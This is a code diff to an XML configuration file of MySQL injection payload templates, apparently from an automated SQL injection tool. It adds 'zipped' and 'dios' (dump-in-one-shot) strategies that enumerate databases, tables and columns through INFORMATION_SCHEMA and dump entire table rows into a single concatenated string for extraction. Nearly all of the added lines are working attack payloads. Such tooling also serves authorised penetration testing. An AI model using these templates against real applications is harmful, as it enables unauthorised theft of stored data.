@@ -110,7 +110,108 @@ select concat(
                     <concat>,0x7f,</concat>
                 </fields>
             </row>
+            <limit>limit ${LIMIT}, 65536</limit>
         </schema>
+        <zipped>
+            <database>
+select concat(
+    ${ENCLOSE_VALUE_HEX},
+    cast(SCHEMA_NAME as char),
+    '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+)
+from INFORMATION_SCHEMA.schemata
+{limit}
+            </database>
+            <table>
+select concat(
+    ${ENCLOSE_VALUE_HEX},
+    cast(TABLE_NAME as char),
+    '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+)
+from information_schema.tables
+where TABLE_SCHEMA = 0x${DATABASE.HEX}
+{limit}
+            </table>
+            <column>
+select concat(
+    ${ENCLOSE_VALUE_HEX},
+    cast(COLUMN_NAME as char),
+    '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+)
+from information_schema.columns
+where TABLE_SCHEMA = 0x${DATABASE.HEX}
+and TABLE_NAME = 0x${TABLE.HEX}
+{limit}
+            </column>
+            <row>
+                <query>
+select concat(
+    ${ENCLOSE_VALUE_HEX},
+    cast(concat(${FIELDS}) as char),
+    '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+)
+from `${DATABASE}`.`${TABLE}`
+{limit}
+                </query>
+                <fields>
+                    <field>trim(ifnull(`${FIELD}`, 0x00))</field>
+                    <concat>,0x7f,</concat>
+                </fields>
+            </row>
+            <limit>limit ${LIMIT}, 1</limit>
+        </zipped>
+        <dios>
+            <database>
+select concat(@:=0,(select count(*) from (
+    select concat(
+        ${ENCLOSE_VALUE_HEX},
+        cast(SCHEMA_NAME as char),
+        '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+    ) a
+    from INFORMATION_SCHEMA.schemata
+)x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+            </database>
+            <table>
+select concat(@:=0,(select count(*) from (
+    select concat(
+        ${ENCLOSE_VALUE_HEX},
+        cast(TABLE_NAME as char),
+        '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+    ) a
+    from information_schema.tables
+    where TABLE_SCHEMA = 0x${DATABASE.HEX}
+)x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+            </table>
+            <column>
+select concat(@:=0,(select count(*) from (
+    select concat(
+        ${ENCLOSE_VALUE_HEX},
+        cast(COLUMN_NAME as char),
+        '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+    ) a
+    from information_schema.columns
+    where TABLE_SCHEMA = 0x${DATABASE.HEX}
+    and TABLE_NAME = 0x${TABLE.HEX}
+)x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+            </column>
+            <row>
+                <query>
+select concat(@:=0,(select count(*) from (
+    select concat(
+        ${ENCLOSE_VALUE_HEX},
+        cast(concat(${FIELDS}) as char),
+        '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+    ) a
+    from `${DATABASE}`.`${TABLE}`
+)x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+                </query>
+                <fields>
+                    <field>trim(ifnull(`${FIELD}`, 0x00))</field>
+                    <concat>,0x7f,</concat>
+                </fields>
+            </row>
+            <limit>limit ${LIMIT}, 1</limit>
+        </dios>
         <file>
             <privilege>
 cast(
